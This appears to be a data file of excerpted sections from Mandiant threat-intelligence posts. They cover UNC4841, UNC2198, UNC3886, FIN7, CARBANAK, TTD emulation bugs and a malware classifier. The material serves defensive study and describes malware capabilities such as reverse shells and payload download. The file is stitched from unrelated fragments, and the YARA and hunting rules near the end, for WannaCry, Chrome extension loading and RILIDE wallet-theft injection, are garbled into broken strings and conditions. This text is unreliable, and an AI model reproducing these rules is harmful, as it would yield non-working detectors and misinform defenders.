regarding CVE-2023-2868 and remediation efforts on May 23, 2023, new malware was deployed by the threat actor beginning on May 22, 2023. These malware families included SKIPJACK, DEPTHCHARGE, FOXGLOVE, FOXTROT, and a new version of SEASPY tracked as SEASPY V2. The first new payload observed was SEASPY v2 on May 22, 2023, followed by DEPTHCHARGE, FOXGLOVE, and FOXTROT from \nMay 30, 2023 through early June. Interestingly, organizations that received these post-remediation malware families were weighted towards government (national), high tech, and information technology sectors. This may suggest a threat actor prioritization towards conventional espionage targets, and maintaining access to IT and managed service providers. \nNotably, among North American identified affected organizations, there were numerous state, provincial, county, tribal, city, and town offices that were targeted in this campaign. These organizations included municipal offices, law enforcement offices, judiciaries of varying levels, social service offices, and several incorporated towns. While overall local government targeting comprises just under seven \npercent of all identified affected organizations, this statistic increases to nearly seventeen percent when compared to U.S.-based targeting alone. In some instances, targeted entities had populations below 10,000 individuals. Local government targeting occurred mostly in the initial months of CVE-2023- 2868 exploitation, with the majority of observed compromises beginning from October through December 2022. The volume of local government organizations impacted by UNC4841 postremediation tools has since fallen to only 8 percent of observed impacted organizations. This decline may represent an evolving operational priority for UNC4841 over the duration of sustained threat activity. \nRegional information technology providers in the United States and Europe experienced a statistically notable volume of targeting among early instances of exploitation in which SALTWATER, SEASPY, and SEASIDE were delivered. These payloads were delivered as part of the initial compromise by UNC4841 without further actions on objectives carried out on the infected device. Mandiant does not maintain thorough visibility into adversary actions during the earlier stages of the campaign. However, we note that several indications were discovered during incident response, which demonstrate the actors were removing traces of their malicious activity on impacted devices. A possible conclusion of these three malware families being observed in isolation is adversaries have not yet prioritized the infected appliances for further compromise and deployment of later stage tools attributed to UNC4841. Alternatively, we recognize that subsequent tooling and indications of malicious activity may have been removed by the actors prior to the start of remediation engagements. \nFrom October 2022 to February 2023, the heightened volume of impacted IT and MSP providers with solely the initial payloads delivered may have been an attempt by UNC4841 to establish an initial foothold within this type of Barracuda ESG environment. Few of these impacted targets received later stage payloads or were associated with targeted commands that sought to exfiltrate data pertaining to specific users. Mandiant assesses with low confidence that this may suggest these organizations were targeted in an attempt to maximize access to domains managed by Barracuda ESG servers, rather than the IT providers being the intended final target of exploitation. Barracuda ESG allows the management of numerous email domains for the scanning of inbound email attachments, and information technology providers and managed service providers may be positioned to manage a greater variety of downstream customer email domains when compared to a single enterprise server. Additionally, as previously noted, high tech and information technology providers were the second most targeted sector by UNC4841 postremediation tooling. \nA deeper examination of identified affected organizations showed a recurring targeting of sectors that are key to global governments maintaining a competitive technological and economic edge in the face of impending strategic state deadlines. Entities were observed within the semiconductor, public health, aerospace, artificial intelligence/autonomous vehicles, and rare earth metal production sectors. Further, religious based organizations were impacted by UNC4841 campaigns. A cluster of organizations with missionbased aid or stated evangelical missions that impact China (and Chinese claimed geographies such as Hong Kong and Taiwan) were observed being targeted with the initial stages of malware utilized by this threat actor. Unlike numerous impacted organizations that align with traditional espionage requirements, these entities only received early stage implants such as SALTWATER, SEASPY, and SEASIDE. This may suggest a lower priority among UNC4841 collection requirements with evidence of deeper compromise, persistence, and exfiltration being observed among entities aligning with more conventional geopolitical, defense, and technology related mandates. \nBased on the evidence available at the time of analysis, earliest compromises appear to have occurred on a small subset of appliances geolocated to mainland China. The C2 communications utilized during this early set of compromises also leveraged port 8080, while later compromises that occurred globally almost entirely leveraged port 443 or port 25. ", "source": "mandiant"}, {"title": "Attribution", "content": "Mandiant has previously assessed with high confidence that UNC4841 conducts espionage activity in support of the People's Republic of China. Our assessment has not changed and has now been corroborated by independent assessments from government agencies. As we mentioned in our first blog post, several overlaps with other Chinanexus actors have been identified throughout our investigation. However, Mandiant has not attributed activity tracked as UNC4841 to a previously known threat actor. ", "source": "mandiant"}, {"title": "Overview", "content": "We begin with an introduction to TTD, detailing its use of a sophisticated CPU emulation layer powered by the Nirvana runtime engine. Nirvana translates guest instructions into host-level micro-operations, enabling detailed capture and precise replay of a program's execution history. \nThe discussion transitions into exploring historical challenges in CPU emulation, particularly for the complex x86 architecture. Key challenges include issues with floating-point and SIMD operations, memory model intricacies, peripheral and device emulation, handling of self-modifying code, and the constant trade-offs between performance and accuracy. These foundational insights lay the \nUnraveling Time: A Deep Dive into TTD Instruction Emulation Bugs | Google Cloud Blog groundwork for our deeper examination of specific instruction emulation bugs discovered within TTD. \nThese include: \nA bug involving the emulation of the pop r16 , resulting in critical discrepancies between native execution and TTD instrumentation. An issue with the push segment  instruction that demonstrates differences between Intel and AMD CPU implementations, highlighting the importance of accurate emulation aligned with hardware behavior Errors in the implementation of the lodsb  and lodsw  instructions, where TTD incorrectly clears upper bits that should remain unchanged. An issue within the WinDbg TTDAnalyze debugging extension, where a fixed output buffer resulted in truncated data during symbol queries, compromising debugging accuracy. \nEach case is supported by detailed analyses, assembly code proof-of-concept samples, and debugging traces, clearly illustrating the subtle but significant pitfalls in modern CPU emulation as it pertains to TTD. \nAdditional bugs discovered beyond those detailed here are pending disclosure until addressed by Microsoft. All bugs discussed in this post have been resolved as of TTD version 1.11.410. ", "source": "mandiant"}, {"title": "Background", "content": "Before we dive into our analysis, let's first discuss what a CNN classifier is doing with Windows PE file bytes. Figure 1 shows the high-level operations performed by the classifier while \"learning\" from the raw executable data. We start with the raw byte representation of the executable, absent any structure that might exist (1). This raw byte sequence is embedded into a high-dimensional space where each byte is replaced with an ndimensional vector of values (2). This embedding step allows the CNN to learn relationships among the discrete bytes by moving them within the ndimensional embedding space. For example, if the bytes 0xe0 and 0xe2 are used interchangeably, then the CNN can move those two bytes closer together in the embedding space so that the cost of replacing one with the other is small. Next, we perform convolutions over the embedded byte \nWhat are Deep Neural Networks Learning About Malware? | Mandiant | Googl sequence (3). As we do this across our entire training set, our convolutional filters begin to learn the characteristics of certain sequences that differentiate goodware from malware (4). In simpler terms, we slide a fixed-length window across the embedded byte sequence and the convolutional filters learn the important features from across those windows. Once we have scanned the entire sequence, we can then pool the convolutional activations to select the best features from each section of the sequence (i.e., those that maximally activated the filters) to pass along to the next level (5). In practice, the convolution and pooling operations are used repeatedly in a hierarchical fashion to aggregate many low-level features into a smaller number of high-level features that are more useful for classification. Finally, we use the aggregated features from our pooling as input to a fully-connected neural network, which classifies the PE file sample as either goodware or malware (6). \nThe specific deep learning architecture that we analyze here actually has five convolutional and max pooling layers arranged in a hierarchical fashion, which allows it to learn complex features by combining those discovered at lower levels of the hierarchy. To efficiently train such a deep neural network, we must restrict our input sequences to a fixed length \u2013 truncating any bytes beyond this length or using special padding symbols to fill out smaller files. For this analysis, we chose an input length of 100KB, though we have experimented with lengths upwards of 1MB. We trained our CNN model on more than 15 million Windows PE files, $80\\%$ of which were goodware and the remainder malware. When evaluated against a test set of nearly $9$ million PE files observed in the wild from June to August 2018, the classifier achieves an accuracy of $95.1\\%$ and an F1 score of 0.96, which are on the higher end of scores reported by previous work. \nIn order to figure out what this classifier has learned about malware, we will examine each component of the architecture in turn. At each step, we use either a sample of 4,000 PE files taken from our training data to examine broad trends, or a smaller set of six artifacts from the NotPetya, WannaCry, and BadRabbit ransomware families to examine specific features. ", "source": "mandiant"}, {"title": "Summary", "content": "In this blog post, we dove into the inner workings of FireEye's byte-based deep learning classifier in order to understand what it, and other deep learning classifiers like it, are learning about malware from its unstructured raw bytes. Through our analysis, we have gained insight into a number of important aspects of the classifier's operation, weaknesses, and strengths: \nImport Features: Import-related features play a large role in classifying malware across all levels of the CNN architecture. We found evidence of ASCII-based import features in the embedding layer, low-level convolutional features, and endto-end features. \nLow-Level Instruction Features: Several features discovered at the lower layers of our CNN classifier focused on sequences of instructions that capture specific behaviors, such as particular types of function calls or code surrounding certain types of exploits. In many cases, these features were primarily associated with malware, which runs counter to the typical use of CNNs in other domains, such as image classification, where low-level features capture generic aspects of the data (e.g., lines \nWhat are Deep Neural Networks Learning About Malware? | Mandiant | Google Cloud Blog and simple shapes). Additionally, many of these low-level features did not appear in the most malicious end-to-end features. \nEnd-to-End Features: Perhaps the most interesting result of our analysis is that many of the most important maliciously-oriented end-toend features closely map to common manuallyderived features from traditional ML classifiers. Features like the presence or absence of certificates, obviously mangled checksums, and inconsistencies in the section table do not have clear analogs to the lower-level features we uncovered. Instead, it appears that the depth and complexity of our CNN classifier plays a key role in generalizing from specific byte sequences to meaningful and intuitive features. \nIt is clear that deep learning offers a promising path toward sustainable, cutting-edge malware classification. At the same time, significant improvements will be necessary to create a viable real-world solution that addresses the shortcomings discussed in this article. The most important next step will be improving the architecture to include more information about the structural, semantic, and syntactic context of the executable rather than treating it as an unstructured byte sequence. By adding this specialized domain knowledge directly into the deep learning architecture, we allow the classifier to focus on learning relevant features for each context, inferring relationships that would not be possible otherwise, and creating even more robust end-to-end features with better generalization properties. \nThe content of this blog post is based on research presented at the Conference on Applied Machine Learning for Information Security (CAMLIS) in Washington, DC on Oct. 12-13, 2018. Additional material, including slides and a video of the presentation, can be found on the conference website. \nAn extended version of the research presented in this blog post can be found in our peer-reviewed paper from the IEEE Deep Learning and Security workshop. A publicly-available version of the paper is also available. \nPosted in Threat Intelligence-Security & Identity ", "source": "mandiant"}, {"title": "Conclusion", "content": "Platform developers should exercise caution when exposing sensitive functionality using abstract UNIX sockets. Instead, use file-based UNIX sockets with the proper filesystem permissions and SEAndroid policy in conjunction with a privileged Android System Services to create a more structured and secure model. Based on follow up analysis, this is the model that Motorola has decided to use. \n2025/5/7 11:37 \nBack That App Up: Gaining Root on the Lenovo Vibe | Mandiant | Google Cloud Blog In addition, allowing backups on privileged applications can also be detrimental and should be disallowed. Just because an application is not running as a privileged Android user ID such as \"android.uid.system\", does not mean that it cannot introduce vulnerabilities and be used to escalate privileges. Finally, applications should never allow executable code (Java classes, ELF binaries, or shared objects) within backups. This can be limited using a BackupAgent. \nPosted in Threat Intelligence-Security & Identity ", "source": "mandiant"}, {"title": "Targeting", "content": "Both sophisticated and simple network intrusions require threat actors to identify a means of initial access, and these actors frequently turn to phishing attacks. As such, OT defenders need to reconsider how to detect and hunt for industrial-targeted phishing. \nSetting up mechanisms to identify early compromises that pose a risk to OT helps defenders decrease the risk of minor threats evolving into \nimpactful events that disrupt production processes. We suggest incorporating the following recommendations: \nPerform threat modeling in OT environments to identify users and groups with access to OT systems and resources that are high-value targets for threat actors. \nLeverage threat intelligence to learn about common initial access techniques, actor infrastructure, and ongoing campaigns targeting industrial organizations. \nTrack distribution of phishing emails and monitor your environment for related patterns including attachment names, toolmarks or phrases within document attachments or email bodies, and filenames. Pay attention to emails from untrusted entities that appeal to personnel in your field of specialization. Understand which types of threat actors target your industry and gain familiarity with the TTPs they use.   \nUsing insights gained from threat intelligence and threat modeling, hunt within your environment to identify OT-specific phishing attempts. When feasible, deploy detection technologies in networks that are adjacent to your OT infrastructure focusing on TTPs used by the actors most likely to target your organization.   \nHunt for post-compromise indicators such as offensive tooling and evidence of privilege \nescalation or credential dumping that may indicate that a threat actor has evaded detection during the initial access phase. Establish response plans to counter instances where credentials may have been stolen \u2013 for example in the event of a data leak. ", "source": "mandiant"}, {"title": "Conclusion", "content": "Despite indictments of members of FIN7 in 2018 and a related sentencing in 2021 announced by the U.S. Department of Justice, at least some members of FIN7 have remained active and continue to evolve their criminal operations over time. Throughout their evolution, FIN7 has increased the speed of their operational tempo, the scope of their targeting, and even possibly their relationships with other ransomware operations in the cybercriminal underground. ", "source": "mandiant"}, {"title": "Attribution", "content": "AP created UNC2198 based on a single intrusion in June 2020 involving ICEDID, BEACON, SYSTEMBC and WINDARC. UNC2198 compromised 32 systems in 26 hours during this incident; however, ransomware was not deployed. Throughout July 2020 we attributed three intrusions to UNC2198 from Incident Response engagements, including one resulting in the deployment of MAZE ransomware. In October 2020, a slew of activity at both Incident Response engagements and Managed Defense clients resulted in the creation of two new UNC groups, and another incident attributed to UNC2198. \nOne of the new UNC groups created in October 2020 was given the designation UNC2374. UNC2374 began as its own distinct cluster where BEACON, \nWINDARC, and SYSTEMBC were observed during an incident at a Managed Defense customer. Initial similarities in tooling did not constitute a strong enough link to merge UNC2374 with UNC2198 yet. \nTwo and a half months following the creation of UNC2374, we amassed enough data points to merge UNC2374 into UNC2198. Some of the data points used in merging UNC2374 into UNC2198 include: \nUNC2198 and UNC2374 Cobalt Strike Team Servers used self-signed certificates with the following subject on TCP port 25055: \n${\\mathsf{C}}={\\mathsf{U}}{\\mathsf{S}}$ , ST $=$ CA, L $=$ California, $0=$ Oracl \nUNC2198 and UNC2374 deployed WINDARC malware to identical file paths: %APPDATA%\\teamviewers\\msi.dll   \nThe same code signing certificate used to sign an UNC2198 BEACON loader was used to sign two UNC2374 SYSTEMBC tunneler payloads. UNC2374 and UNC2198 BEACON C2 servers were accessed by the same victim system within a 10-minute time window during intrusion operations. \nThe other UNC group created in October 2020 was given the designation UNC2414. Three separate intrusions were attributed to UNC2414, and as the cluster grew, we surfaced similarities between UNC2414 and UNC2198. A subset of the data points used to merge UNC2414 into UNC2198 include: \nUNC2198 and UNC2414 BEACON servers used self-signed certificates using the following subject on TCP port 25055: \n${\\mathsf{C}}={\\mathsf{U}}{\\mathsf{S}}$ , ST $=$ CA, L $=$ California, $0=$ Oracl \nUNC2198 and UNC2414 installed BEACON as   \nC:\\Windows\\int32.dll   \nUNC2198 and UNC2414 installed the RCLONE   \nutility as C:\\Perflogs\\rclone.exe   \nUNC2198 and UNC2414 were proven to be   \nfinancially motivated actors that had leveraged   \nICEDID as initial access: UNC2198 had deployed MAZE UNC2414 had deployed EGREGOR \nThe merge between UNC2198 and UNC2414 was significant because it revealed UNC2198 has access to EGREGOR ransomware. The timing of the EGREGOR usage is also consistent with MAZE ransomware shutting down as reported by Mandiant Intelligence. Figure 3 depicts the timeline of related intrusions and merges into UNC2198. ", "source": "mandiant"}, {"title": "Appendix", "content": "PHOTOLOADER is a downloader that has been observed to download ICEDID. It makes an HTTP request for a fake image file, which is RC4 decrypted to provide the final payload. Host information is sent to the command and control (C2) via HTTP cookies. Samples have been observed to contain an embedded C2 configuration that contain the real C2 with a number of non-malicious \nSo Unchill: Melting UNC2198 ICEDID to Ransomware Operations | Mandiant | Google Cloud Blog domains. The non-malicious domains are contacted in addition to the real C2. \nWINDARC is a backdoor that hijacks the execution of TeamViewer to perform C2 communication. It supports plugins and accepts several backdoor commands. The commands include interacting with the TeamViewer tool, starting a reverse shell, loading new plugins, downloading and executing files, and modifying configuration settings. \nSYSTEMBC is a proxy malware that beacons to its C2 and opens new proxy connections between the C2 and remote hosts as indicated by the C2. Proxied communications are encrypted with RC4. The malware receives commands via HTTP and creates new proxy connections as directed. Underground sales advertisements refer to the software as a \"socks5 backconnect system\". The malware is typically used to hide the malicious traffic associated with other malware. ", "source": "mandiant"}, {"title": "Appendix", "content": "FireEye security solutions detect these threats across email, endpoint, and network levels. The following is a snapshot of existing detections related to activity outlined in this blog post. \n(UTILITY) MOUSEISLAND (DOWNLOADER) MOUSEISLAND A (DOWNLOADER) MOUSEISLAND B (DOWNLOADER) POWERSHELL DOWNLOADER (METHODOLOGY) POWERSHELL DOWNLOADER D (METHODOLOGY) SCHTASK CREATION FROM PROGRAMDATA (COLLECTION) SUSPICIOUS BITSADMIN USAGE A (METHODOLOGY) SUSPICIOUS POWERSHELL USAGE (METHODOLOGY) WMIC SHADOWCOPY DELETE (METHODOLOGY) Malware Protection (AV/MG) SYSTEMBC Trojan.EmotetU.Gen.\\* Trojan.Mint.Zamg.O Generic.mg.\\* ICEID Gen:Variant.Razy.\\* Generic.mg.\\* BEACON Gen:Trojan.Heur.TP.TGW@bug909d Gen:Variant.Bulz.1217 ", "source": "mandiant"}, {"title": "Attribution", "content": "UNC3886 is a highly adept China-nexus cyber espionage group that has historically targeted network devices and virtualization technologies with zero-day exploits. UNC3886 interests seem to be focused mainly on defense, technology, and telecommunication organizations located in the US and Asia. The activity described in this blog post is the latest in a number of operations where UNC3886 has leveraged custom malware to target network devices. The malware deployed on Juniper Networks' Junos OS routers demonstrates that UNC3886 has in-depth knowledge of advanced system internals. Furthermore, UNC3886 continues to prioritize stealth in its operations through the use of passive backdoors, together with log and forensics artifact tampering, indicating a focus on long-term persistence, while minimizing the risk of detection. ", "source": "mandiant"}, {"title": "Overview", "content": "Mandiant's investigation identified six distinct malware samples across multiple Juniper MX routers. Each sample is a modified version of a TINYSHELL backdoor, but with unique capabilities. All of these samples incorporate a core TINYSHELL \nJunos OS specific features. \nThe following malware samples were identified: \n1. appid  - TINYSHELL-based active backdoor, mimicking a legitimate binary named appidd (Application Identification Daemon)   \n2. to  - TINYSHELL-based active backdoor, mimicking a legitimate binary named top (Table of Processes)   \n3. irad  - TINYSHELL-based passive backdoor, mimicking a legitimate binary named irsd (Interface Replication and Synchronization Daemon)   \n4. lmpad  - TINYSHELL-based utility and passive backdoor, mimicking a legitimate binary named lmpd (Link Management Protocol Daemon)   \n5. jdosd  - TINYSHELL-based passive backdoor, mimicking a legitimate binary named jddosd (Juniper DDOS protection Daemon)   \n6. oemd  - TINYSHELL-based passive backdoor, mimicking a legitimate binary named oamd (Operation, Administration and Maintenance Daemon) ", "source": "mandiant"}, {"title": "Conclusion", "content": "These recent announcements by U.S. law enforcement highlight the positive impact that can result from synergy between private and public sector organizations in disrupting organized cyber crime operations. As demonstrated by FIN7, financially-motivated threat actors are becoming extremely advanced and are capable of inflicting significant harm on organizations through vast, but carefully orchestrated campaigns. As sophisticated threat groups continue to emerge, partnerships, such as those exhibited here, will almost certainly play a key role in combating these threats. \nJordan Nuce, Tom Bennett, Michael Bailey, and Daniel Bohannon ", "source": "mandiant"}, {"title": "Appendix", "content": "FireEye has responded to many FIN7 incidents, which has provided us extensive insight into their operations. As part of this blog post, we are also including numerous indicators that we attribute to FIN7 and an overview of their techniques to aid organizations in identifying malicious activity across their networks. ", "source": "mandiant"}, {"title": "Conclusion", "content": "Having access to the source code and toolset for CARBANAK provided us with a unique opportunity to revisit our previous analysis. We were able to fill in some missing analysis and context, validate our deductions in some cases, and provide further evidence in other cases, strengthening our confidence in them but not completely proving them true. This exercise proves that even without access to the source code, with a large enough sample set and enough analysis, accurate deductions can be reached that go beyond the source code. It also illustrates, such as in the case of the tinymet command, that sometimes, without the proper context, you simply cannot see the full and clear purpose of a given piece of code. But some source code is also inconsistent with the accompanying binaries. If Bruce Lee had been a malware analyst, he might have said that source code is like a finger pointing away to the moon; don't concentrate on the finger, or you will miss all that binary ground truth. Source code can provide immensely rich context, but analysts must be cautious not to misapply that context to binary or forensic artifacts. \nIn the next and final blog post, we share details on an interesting tool that is part of the CARBANAK kit: a video player designed to play back desktop recordings captured by the backdoor. ", "source": "mandiant"}, {"title": "Appendix", "content": "https://cloud.google.com/blog/topics/threat-intelligence/wannacry-malware-profile \nFireEye has developed the following Yara rules for WannaCry detection: \nrule FE_RANSOMWARE_WANNACRY { meta:version $=$ \".4\" filetype $=$ \"PE\" author $=$ \"Ian.Ahl@fireeye.com @T date $=$ \"2017-05-12\" description $=$ \"Generic detection \nstrings: \n// Bitcoin URLs $\\$60@$ \"http://www.btcfrog. $\\$60@$ \"https://www.google. \n// Ransom Message $\\$123,456$ \"Congratulations! Succ $\\$11S82$ \"Start decrypting now!\" $\\$103$ your files have be $\\$11S84=$ \"Pay now, if you want t $\\$11S85$ \"Send $\\$\\%0$ worth of bit $\\$11S896,7$ \"Ooops, your files hav // WANNA Strings \\$wanna1 $=$ \"Wanna Decryptor 1.0\" \\$wanna2 $=$ \"Wana Decrypt0r\" asc \\$wanna3 $=$ \"Wana Decryptor\" asci \\$wanna4 $=$ \"WANNACRY\" ascii wid \\$wanna5 $=$ \"WanaCrypt0r\" ascii w \\$wanna6 $=$ \"WANACRY!\" ascii wid \\$wanna7 $=$ \"WNcry@2ol7\" ascii wi \\$wanna8 $=$ \"wcry@123\" \ncondition: ( ( (uint16 ) and ( all of \nPosted in Threat Intelligence ", "source": "mandiant"}, {"title": "Conclusion", "content": "The newest improvements add .NET executable analysis support to capa and make its rules even more expressive. The 4.0 capa release also includes bug fixes, new features, improvements to the freeze and JSON results serialization formats, and more than 60 new and updated rules. See the capa changelog for all update details. \nPosted in Threat Intelligence-Security & Identity ", "source": "mandiant"}, {"title": "Conclusion", "content": "Living off the Land attacks have become far more common as attackers have learned to make use of built-in tools to evade detection. The novel use of the serial console by attackers is a reminder that these attacks are no longer limited to the operating system layer. Mandiant recommends that organizations restrict access to remote administration channels and disable SMS as a multifactor authentication method wherever possible. This article by Microsoft contains recommendations regarding the implementation of phishing-resistant MFA options. Additionally, Mandiant recommends reviewing user account permissions for overly permissive users and implementing appropriate Conditional Access Authentication Strength policies. The available authentication methods in Azure AD are on the Microsoft website, while least privilege access to the serial console can be configured according to the following Microsoft guidance. The following appendices contain additional details regarding Microsoft Azure Extensions, serial console logging, and various detection opportunities which organizations can use to detect this attack method. ", "source": "mandiant"}, {"title": "Conclusion", "content": "While hunting for this chain of adversary methodologies, Mandiant uncovered numerous new malware families and investigations. The adversary's effort to remain undetected by chaining methodologies has come with mixed results, as many of the samples discussed in this post have very low detection ratings. However, with this new research, detecting these methodologies should be more accessible and further expand the defender's hunting and detection repertoire. ", "source": "mandiant"}, {"title": "Appendix", "content": "rule M_Hunting_Embedded_Chromium_CRX_1 { \nmeta: \nauthor $=$ \"Mandiant\" md5 $=$ \"f1c21a69ed9f85e12d58ef0f5ac5c9b1\" description $=$ \"Hunting for non-CRX files \nstrings: \ncondition: \n( $((\\mathrm{uint16}(\\Theta)==\\Theta{\\times}5\\mathrm{A}4\\mathrm{D})$ and uint32(uint32( $0\\times3($ ( $((20f(\\Phi\\mathsf{a}^{*}))$ and $\\$1$ ) or ((1 of $(\\$0^{*})$ ) and (\\$ \\$pk and   \n(#pk ${>}1$ ) and   \n(for any i in (1..#pk) : ( $\\$02$ at $\\mathbb{(0|p|<[i]+3\\theta)}$ ) a (for any j in (1..#pk) : ( $\\$1$ at $(\\boldsymbol{\\theta}|\\mathsf{p}|<[\\dot{\\mathsf{1}}]+3\\mathsf{0})$ ) \nrule M_Hunting_Embedded_Chromium_CRXandLNK_1 { \nmeta: \nauthor $=$ \"jared.wilson\" md5 $=$ \"f1c21a69ed9f85e12d58ef0f5ac5c9b1\" description $=$ \"Hunting for non-CRX files w \nstrings: \n$\\$01=$ \"_metadata\" ascii   \n$\\$02$ \"manifest.json\" ascii   \n$\\$03$ \"verified_contents.json\" ascii   \n$\\$51=$ \"_locales\" ascii   \n$\\$52$ \"messages.json\" ascii   \n$\\$123,456,78$ .(html|htm|css|js)/ ascii   \n$\\$123,456,7893,78945$   \n$\\$10a d$ \"--load-extension\" ascii wide   \n$\\$1nK1=$ \"Google Chrome.lnk\" ascii wide \ncondition: \n( $((\\mathrm{uint16}(\\Theta)==\\Theta{\\times}5\\mathrm{A}4\\mathrm{D})$ ) and uint32(uint32(0x3C (((2 of $(\\$0^{*})$ ) and $\\$1$ ) or ((1 of $(\\$0^{*})$ ) and (\\$ $\\$9K$ and   \n(#pk ${>}1$ ) and   \n(for any i in (1..#pk) : ( $\\$02$ at $\\mathbb{(}0|p|<[\\mathrm{i}]+3\\Theta)$ ) a (for any j in (1..#pk) : ( $\\$1$ at $(\\boldsymbol{\\theta}|\\mathsf{p}|<[\\dot{\\mathsf{1}}]+3\\mathsf{0})$ ) an (\\$load or $\\$1n|$ ) \n} \nrule M_Hunting_AdvancedInstaller_LNK_1   \n{ meta: author $=$ \"Mandiant\" \nmd5 $=$ \"2782af385665c765807ed887d4bacf36\" description $=$ \"Hunting for Advanced Installer \nstrings: \n$\\$01=$ \"Advanced Installer\" wide   \n$\\$02$ \"Advanced Installer\" ascii   \n$\\$03$ \"https://www.advancedinstaller.com\" asci $\\$11~=$ \"Google Chrome.lnk\"   \n$\\$12$ \"Brave.lnk\"   \n\\$p1 = \"\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Progr \\$p2 = \"\\\\Microsoft\\\\Internet Explorer\\\\Quick L \\$p3 = \"\\\\Microsoft\\\\Internet Explorer\\\\Quick L \\$p4 = \"\\\\Microsoft\\\\Internet Explorer\\\\Quick L \\$p5 = \"\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Progr \\$p6 = \"\\\\Microsoft\\\\Internet Explorer\\\\Quick L $\\$1$ .CreateShortcut\\ $([\\hat{\\bf\\Psi}\\hat{\\bf\\Phi}\\backslash)]+\\hat{\\bf\\Phi})/$ \ncondition: $((\\mathrm{uint16}(\\Theta)==\\Theta{\\times}5\\mathrm{A}4\\mathrm{D})$ ) and uint32(uint32(0x3C) } \nrule M_Hunting_LNKEngine_LoadExtension_1   \n{ meta: author $=$ \"Mandiant\" description $=$ \"Hunting rule that looks for fil md5 $=$ \"30abf9ca1bb792eb5edd8b033c010979\" \nstrings: \ncondition: $(\\mathrm{uint}32(\\theta)=\\Theta\\times\\theta\\Theta\\theta\\Theta\\theta\\theta4c)$ and filesize < 50KB \nrule M_Hunting_LNKEngine_LoadExtension_Temp_1   \n{ meta: author $=$ \"Mandiant\" description $=$ \"Hunting rule that looks for file \nmd5 $=$ \"30abf9ca1bb792eb5edd8b033c010979\" \n\\$e \nrule M_Hunting_Process_Chromium_LoadExtension_1   \n{ meta: author $=$ \"Mandiant\" md5 $=$ \"f1c21a69ed9f85e12d58ef0f5ac5c9b1\" description $=$ \"Hunting for cases where Chrome severity $=$ \"Medium\"   \nevents:   \n$\\$6$ .metadata.event_type $=$ \"PROCESS_OPEN\"   \n$\\$6$ .target.process.command_line $=$ /(chrome|brave|msedge   \n$\\$6$ .target.process.file.full_path $=$ /(chrome|brave|msedg condition:   \n\\$e   \n}   \nrule M_Hunting_FileWrite_Chrome_LNK_1   \n{ meta: author $=$ \"Mandiant\" md5 $=$ \"f1c21a69ed9f85e12d58ef0f5ac5c9b1\" description $=$ \"Hunting for cases where the LNK severity $=$ \"Medium\" events: $\\$6$ .metadata.event_type $=$ \"FILE_CREATION\" \\$e.target.file.full_path $=$ /Google Chrome\\.lnk (\\$e.target.file.full_path $=$ \\`C:\\ProgramData\\Mi (\\$e.principal.process.file.full_path $=\\prime\\left[\\mathsf{a}-\\mathsf{z}\\mathsf{A}\\cdot\\mathsf{\\Lambda}\\right] $ condition: \\$e   \n}   \nrule M_Hunting_FileWrite_CRXandLNK_1   \n{ meta: author $=$ \"Mandiant\" md5 $=$ \"f1c21a69ed9f85e12d58ef0f5ac5c9b1\" description $=$ \"Hunting for cases where a proce severity $=$ \"Medium\"   \nevents: $\\$1$ .metadata.event_type $=$ \"FILE_CREATION\" $\\$62$ .metadata.event_type $=$ \"FILE_CREATION\" $\\$103,4561$ .principal.process.file.md5 $\\$1$ .principal.process.file.md5 $=\\$62$ .principal $\\$1$ .principal.process.file.md5 $\\!=$ \"\" $\\$1$ .principal.hostname $=\\$62$ .principal.hostnam $\\$1$ .principal.hostname $\\!=$ \"\" $\\$1$ .principal.process.pid $=\\$62$ .principal.pro $\\$1$ .principal.process.pid ! $\\!=$ \"\" (((( $\\$1$ .principal.file.file_type $=$ \"FILE_TYPE   \nmatch: \\$md5 over 1m   \ncondition: \\$e1 and \\$e2 \n} \nrule M_Hunting_FileWrite_ManifestandLNK_1 { meta: author $=$ \"Mandiant\" md5 $=$ \"f1c21a69ed9f85e12d58ef0f5ac5c9b1\" description $=$ \"Hunting for cases where a proce severity $=$ \"Medium\" events: $\\$1$ .metadata.event_type $=$ \"FILE_CREATION\" $\\$62$ .metadata.event_type $=$ \"FILE_CREATION\" $\\$103,4561$ .principal.process.file.md5 $\\$1$ .principal.process.file.md5 $=\\$62$ .principal $\\$1$ .principal.process.file.md5 $\\!=$ \"\" $\\$1$ .principal.hostname $=\\$62$ .principal.hostnam $\\$1$ .principal.hostname $\\!=$ \"\" $\\$1$ .principal.process.pid $=\\$62$ .principal.proc $\\$1$ .principal.process.pid ! $\\!=$ \"\" ((( $\\$1$ .target.file.full_path $=$ /\\\\manifest\\.js match: \\$md5 over 1m condition: \\$e1 and \\$e2   \n}   \n\uedd9 \n// M_Hunting_FileWrite_ManifestandChromeLNK_1 tag:peexe and ((behaviour_files:\"C:\\\\Users\\\\Public\\\\Des rule M_Hunting_RILIDE_InjectJS_1 { \nmeta: \nauthor $=$ \"Mandiant\" md5 $=$ \"9fe5b99b20bc91995b81eddd917bff50\" description $=$ \"Hunting for the code that \nstrings: \n\\$banner $=$ \"https://public.bnbstatic.com/image/ $\\$51=$ \"[Bybit]Withdrawal Request\" ascii   \n$\\$52$ \"[Bybit] Authorize New Device\" ascii $\\$01=$ \"created a withdrawal request\"   \n$\\$02$ \"Authorize New Device You recently attem $\\$03$ \"Please check your withdrawal address ca $\\$04$ \"Verification Code Of Withdrawal\"   \n$\\$06$ \"Withdrawal Verification Code\"   \n$\\$07$ \"Verification Code Of Authorization\" $\\$08$ \"initiate this withdrawal or the address $\\$09$ \"Authorize New Device You recently attem $\\$010$ \"Confirm your new withdrawal address\" $\\$011$ \"A new withdrawal address was just adde $\\$1=$ \"div:contains(\\\"Binance\\\"), div:contains $\\$12$ \"binance()\" fullword   \n$\\$123$ \"div:contains(\\\"Bybit\\\"), div:contains(\\ $\\$14$ \"bybit()\" fullword   \n$\\$123$ \"div:contains(\\\"Huobi\\\"), div:contains( $\\$123,456,7$ \"huobi()\" fullword   \n$\\$123$ \"div:contains(\\\"Okx\\\"), div:contains(\\\"o $\\$123,456$ \" fullword   \n$\\$12$ \"div:contains(\\\"Kraken\\\"), div:contains( $\\$10$ \"kraken()\" fullword \ncondition: filesize < 1MB and \\$banner and (1 of $(\\$5^{*})$ ) an \nrule M_Hunting_RILIDE_InjectJS_2   \n{ meta: author $=$ \"Mandiant\" \nmd5 $=$ \"6e426758f184b5a942428731b749b000\" description $=$ \"Hunting for the code that RILI \nstrings: \n\\$anchor $=$ \"const DOMAIN $=$ 'https://extenision  \n$\\$12$ \"exchangeRates\" ascii fullword   